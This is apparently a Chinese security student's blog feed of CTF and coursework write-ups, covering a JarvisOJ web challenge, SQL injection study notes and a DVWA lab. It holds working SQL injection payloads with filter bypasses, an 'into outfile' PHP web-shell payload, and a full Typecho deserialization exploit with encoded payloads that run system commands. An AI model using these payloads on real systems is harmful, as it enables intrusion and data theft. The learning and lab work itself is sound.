<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> </span></span><br><span class="line"><span class="meta">  <span class="meta-string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-class">.title</span> &#123;</span></span><br><span class="line">	background-image:url(data:image/gif;base64,R0lGODlhAQAcALMAAMXh96HR97XZ98Hf98Xg97DX97nb98Lf97vc98Tg973d96rU97ba97%2Fe96XS9wAAACH5BAAAAAAALAAAAAABABwAAAQVMLhVBDNItXESAURyDI2CGIxQLE4EADs%3D);</span><br><span class="line"><span class="css">	<span class="selector-tag">background-repeat</span><span class="selector-pseudo">:repeat-x</span>;</span></span><br><span class="line"><span class="css">	<span class="selector-tag">height</span><span class="selector-pseudo">:28px</span>;</span></span><br><span class="line">	line-height: 28px;</span><br><span class="line"><span class="css">	<span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618160036095.png"  alt="image-20200618160036095"></p>
<p>data类型的Url大致有以下几种形式</p>
<p>data:,&lt;文本数据&gt;<br>data:text/plain,&lt;文本数据&gt;<br>data:text/html,&lt;HTML代码&gt;<br>data:text/html;base64,&lt;base64编码的HTML代码&gt;<br>data:text/css,&lt;CSS代码&gt;<br>data:text/css;base64,&lt;base64编码的CSS代码&gt;<br>data:text/javascript,&lt;Javascript代码&gt;<br>data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;<br>data:image/gif;base64,base64编码的gif图片数据<br>data:image/png;base64,base64编码的png图片数据<br>data:image/jpeg;base64,base64编码的jpeg图片数据<br>data:image/x-icon;base64,base64编码的icon图片数据</p>
</blockquote>
<p>输入?id=0e&amp;a=data:,1112 is a nice lab!&amp;b=%00411111,返回</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618170326089.png"  alt="image-20200618170326089"></p>
<p> {/^HT2mCpcvOLf} 不像flag，像一个目录，于是，尝试在地址栏输入：<code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf</code></p>
<p>返回<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618170422676.png"  alt="image-20200618170422676"></p>
<p>发现跳转后自动补id=1，考虑sql注入</p>
<p>尝试id=1 or 1=1</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618170552202.png"  alt="image-20200618170552202"></p>
<p>怀疑空格有问题，用/<em>\</em>/代替</p>
<p>还是不行，可能过滤了**,改为/*1*/,显示正常<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618170904600.png"  alt="image-20200618170904600"></p>
<p>and 1=1也没问题，and 1=2报错</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618170958621.png"  alt="image-20200618170958621"></p>
<p>输入id=1/*1*/order/*1*/by/*1*/3显示正常，但是4报错，说明有三个字段</p>
<p>下面开始爆数据库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(database())%23</span><br></pre></td></tr></table></figure>
<p>得到数据库名test</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618193932873.png"  alt="image-20200618193932873"></p>
<p>接下来开始爆表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(seselectlect&#x2F;*12*&#x2F;group_concat(table_name)&#x2F;*12*&#x2F;frfromom&#x2F;*12*&#x2F;information_schema.tables&#x2F;*12*&#x2F;where&#x2F;*12*&#x2F;table_schema&#x3D;database())%23</span><br></pre></td></tr></table></figure>


<p>得到表名：content</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618193952200.png"  alt="image-20200618193952200"></p>
<p>接下来爆列名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(selselectect&#x2F;*12*&#x2F;group_concat(column_name)&#x2F;*12*&#x2F;frofromm&#x2F;*12*&#x2F;information_schema.columns&#x2F;*12*&#x2F;where&#x2F;*12*&#x2F;table_name&#x3D;0x636f6e74656e74)%23</span><br></pre></td></tr></table></figure>

<p>得到列名：context</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618194018181.png"  alt="image-20200618194018181"></p>
<p>读取内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;seselectlect&#x2F;*12*&#x2F;1,2,(selselectect&#x2F;*12*&#x2F;context&#x2F;*12*&#x2F;frofromm&#x2F;*1*&#x2F;content)%23</span><br></pre></td></tr></table></figure>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200618194057752.png"  alt="image-20200618194057752"></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h1><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/06/16/jarvisoj/jarvisoj_web/image-20200620145708388.png"  alt="image-20200620145708388"></p>
<p>连接：<a href="https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172" target="_blank" rel="noopener">https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</a></p>
<p>参考题解：<a href="https://www.jianshu.com/p/e4d61c50cb67?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation" target="_blank" rel="noopener">https://www.jianshu.com/p/e4d61c50cb67?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></p>
<p>udf.so是linux上的mysql函数</p>
<p>先在阿里云上拉一个docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull mysql</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -p 3306:3306 --name ctf-mysql -v D:\security\docker:&#x2F;tmp  -e LANG&#x3D;C.UTF-8 -e MYSQL_ROOT_PASSWORD&#x3D;123456 -d  mysql</span><br></pre></td></tr></table></figure>

<p>根据题解运行没有成功，先放下回来再说。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title> sql注入攻击与防御</title>
    <url>/2020/06/15/sqli/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="第二章知识点回忆"><a href="#第二章知识点回忆" class="headerlink" title="第二章知识点回忆"></a>第二章知识点回忆</h1><ul>
<li><p>利用having ‘1’=’1 列举列名xxx， group by xxx having ‘1’=’1列举下一个列名</p>
<ul>
<li><a href="http://xxxxxxxxx?id=xxx&#39;" target="_blank" rel="noopener">http://xxxxxxxxx?id=xxx&#39;</a> group by xxx having ‘1’=’1’</li>
</ul>
</li>
<li><p><a href="http://xxxxxxxxx?id=xxx" target="_blank" rel="noopener">http://xxxxxxxxx?id=xxx</a>; select * from users having 1=1;–</p>
</li>
<li><p>0/xxx 列举表中的数值</p>
</li>
<li><p><a href="http://xxxxxxxxx?id=xxx&#39;" target="_blank" rel="noopener">http://xxxxxxxxx?id=xxx&#39;</a> and 1=0/name;– </p>
</li>
<li><p>通过注入单引号后页面返回的错误判断数据库类型，mysql？oracle？等（书P33）</p>
</li>
<li><p>输入user’ or 1=1返回所有页面，and 1=1返回单个商品</p>
</li>
<li><p>判断?id=3-1是否与?id=2返回相同的页面，如果相同。则可以直接进行减法运算</p>
<ul>
<li>加法也课尝试，但是+是URI保留字，可以用%2B代替</li>
</ul>
</li>
<li><p>区分数值型注入和字符串型注入（有无单引号）</p>
</li>
<li><p>所有的数据库都可以使用”–“进行单行注释，”/**/“进行多行注释，其中mysql还可以用#进行单行注释</p>
</li>
<li><p>若空格被过滤，则可以使用没有内容的多行注释来避免使用空格</p>
<ul>
<li>?uid=45/**/or/**/1=1</li>
</ul>
</li>
<li><p>输入?uid=45/*hello yes*/,若返回内容与uid=45相同，则说明注释成功，可能存在sql注入</p>
</li>
<li><p>?s=test’; select ‘&lt;php echo shell_exec($_GET[“cmd”]);?&gt;’ into outfile ‘/var/www/victim.com/shell.php’;–</p>
<ul>
<li>检索名为cmd的GET参数的值在一个操作系统shell中加以执行，并写入文件中</li>
</ul>
</li>
<li><p>时间延迟</p>
<table>
<thead>
<tr>
<th>服务器种类</th>
<th>语句</th>
</tr>
</thead>
<tbody><tr>
<td>sql server</td>
<td>?uid=45; waitfor delay ‘hours:minutes:seconds’</td>
</tr>
<tr>
<td>mysql</td>
<td>?uid=45; select benchmark(100000,encode(‘hello’,’mom))</td>
</tr>
<tr>
<td>oracle pl/sql</td>
<td>?uid=45 or 1=dbms_pipe.receive_message（‘RDS’,10)</td>
</tr>
<tr>
<td>postgresql(&gt;=8.2)</td>
<td>select pf_sleep(10);–</td>
</tr>
</tbody></table>
</li>
</ul>
<h1 id="第三章-复查代码中的SQL注入"><a href="#第三章-复查代码中的SQL注入" class="headerlink" title="第三章 复查代码中的SQL注入"></a>第三章 复查代码中的SQL注入</h1><p> 造成sql注入的原因是没有对输入进行检查</p>
<p>手动检查代码（静态）可以利用grep命令检查是否直接使用了没有检查过的输入参数，可以配合grep命令进行筛查，注意不同数据库有不同的处理函数</p>
<p>（具体指令在书上做了标记，内容比较多，就不抄过来了）</p>
<p>也可以使用一些工具搭配owasp进行练习</p>
<h1 id="第四章-利用SQL注入"><a href="#第四章-利用SQL注入" class="headerlink" title="第四章 利用SQL注入"></a>第四章 利用SQL注入</h1><ul>
<li><p>堆叠查询：执行多条sql语句</p>
</li>
<li><p>非盲跟踪：利用报错信息判断是什么数据库</p>
</li>
<li><p>P116，获取version信息</p>
<ul>
<li>id=@@version</li>
<li>name=’%2B@@version%2B’</li>
</ul>
</li>
<li><p>查看字符串的衔接方式，判断数据库种类</p>
</li>
<li><p>利用数字函数判断数据库种类</p>
</li>
<li><p>UNION判断列</p>
<ul>
<li>id=12+union+select+null – 利用null的个数判断列</li>
</ul>
</li>
<li><p>order by 判断列数（效率更高）二分查找</p>
</li>
<li><p>匹配数据类型</p>
<ul>
<li><p>id=12+union+select+’test’,null,null,null</p>
</li>
<li><p>得到更多信息</p>
<p>id=12+union+select+NULL,system_user,db_nam(),NULL</p>
<p>使用连接符运行多个请求 （SQL Server） SELECT NULL, system_user + ‘|’ +db_name(), NULL,NULL</p>
</li>
</ul>
</li>
<li><p>union查询只显示第一行</p>
<ul>
<li><p>添加永假条件，只返回union后面的结果(第一条)</p>
<p>id=12+and+1=0+union+select+NULL,system_user,NULL,NULL</p>
<p>然后再在后面的查询中对查询结果进行约束，可以得到后面的结果</p>
</li>
</ul>
</li>
<li><p>基于时间：</p>
<ul>
<li>id=12;if+(system_user=’sa’)+waitfor+delay+’0:0:5’–</li>
<li>检查数据库版本信息 <ul>
<li>if (substring((select @@version),25,1)=5) waitfor delay ‘0:0:5’–</li>
</ul>
</li>
</ul>
</li>
<li><p>查询information_schema</p>
</li>
</ul>
]]></content>
      <categories>
        <category>sqli</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业十三：复现反序列化漏洞</title>
    <url>/2020/06/12/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%B8%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>复现11.2.3中的反序列化漏洞，并执行其他的系统命令</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*typecho.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName)</span></span>&#123;</span><br><span class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $item;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;item[<span class="string">'author'</span>]-&gt;screenName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">                $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $value = $default;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">                $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">                call_user_func($filter, $value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$config = unserialize(base64_decode($_GET[<span class="string">'__typecho_config'</span>]));</span><br><span class="line">$db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*exp.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $item;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;item = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'author'</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = <span class="string">'phpinfo()'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'adapter'</span> =&gt; <span class="keyword">new</span> Typecho_Feed()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问exp.php得到payload<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%B8%89/image-20200608201906816.png"  alt="image-20200608201906816"></p>
<p>/<em>exp.php</em>/ YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6MTp7czoxODoiAFR5cGVjaG9fRmVlZABpdGVtIjthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19<br>访问</p>
<p><a href="http://127.0.0.1/1/typecho.php?__typecho_config=YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6MTp7czoxODoiAFR5cGVjaG9fRmVlZABpdGVtIjthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19" target="_blank" rel="noopener">http://127.0.0.1/1/typecho.php?__typecho_config=YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6MTp7czoxODoiAFR5cGVjaG9fRmVlZABpdGVtIjthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19</a></p>
<p>成功调用phpinfo()</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十三/image-20200608202724492.png"  alt="image-20200608202724492" style="zoom:50%;">

<p>执行其他系统命令</p>
<p>系统为windows系统，将phpinfo()更换为system(‘dir’)</p>
<p>拿到payload，访问</p>
<p><a href="http://127.0.0.1/7/typecho.php?__typecho_config=YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6MTp7czoxODoiAFR5cGVjaG9fRmVlZABpdGVtIjthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjEzOiJzeXN0ZW0oJ2RpcicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX0" target="_blank" rel="noopener">http://127.0.0.1/7/typecho.php?__typecho_config=YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6MTp7czoxODoiAFR5cGVjaG9fRmVlZABpdGVtIjthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjEzOiJzeXN0ZW0oJ2RpcicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX0</a></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%B8%89/image-20200609102044195.png"  alt="image-20200609102044195"></p>
<p>调用成功</p>
]]></content>
      <categories>
        <category>漏洞测试作业</category>
      </categories>
      <tags>
        <tag>漏洞测试</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞测试作业十二：SQL注入</title>
    <url>/2020/06/09/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>基于DVWA里的SQL盲注案例，实施手工盲注，参考课本，撰写实验报告</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="使用sqlmap"><a href="#使用sqlmap" class="headerlink" title="使用sqlmap"></a>使用sqlmap</h3><h4 id="安装owasp"><a href="#安装owasp" class="headerlink" title="安装owasp"></a>安装owasp</h4><p>解压压缩包，用vmware打开</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200609110659285.png"  alt="image-20200609110659285" style="zoom: 45%;">

<p>登录</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200609110759362.png"  alt="image-20200609110759362" style="zoom:45%;">

<p>访问<a href="http://192.168.89.145" target="_blank" rel="noopener">http://192.168.89.145</a></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200609111042872.png"  alt="image-20200609111042872" style="zoom: 33%;">

<p>安装成功</p>
<p>选择 Damn Vulnerable Web Application,输入用户名和密码，进行登录，用户名密码均为user</p>
<p>设置安全级别为low</p>
<h4 id="进行攻击"><a href="#进行攻击" class="headerlink" title="进行攻击"></a>进行攻击</h4><p>选择sql injection，在userID处输入‘</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/image-20200609113019862.png"  alt="image-20200609113019862"></p>
<p>输入1</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200609113328662.png"  alt="image-20200609113328662" style="zoom:67%;">





<p>查看源码<img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/image-20200609113414402.png"  alt="image-20200609113414402"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line">    </span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>复制输入1后的网址，运行sqlmap</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/image-20200609114119796.png"  alt="image-20200609114119796"></p>
<h5 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h5><p>更改浏览器设置</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200609114412463.png"  alt="image-20200609114412463" style="zoom:50%;">

<h5 id="拦截cookie"><a href="#拦截cookie" class="headerlink" title="拦截cookie"></a>拦截cookie</h5><p>安装paros,打开，模拟会话劫持攻击</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install paros</span><br></pre></td></tr></table></figure>

<p>得到网站请求痕迹，找到seession id</p>
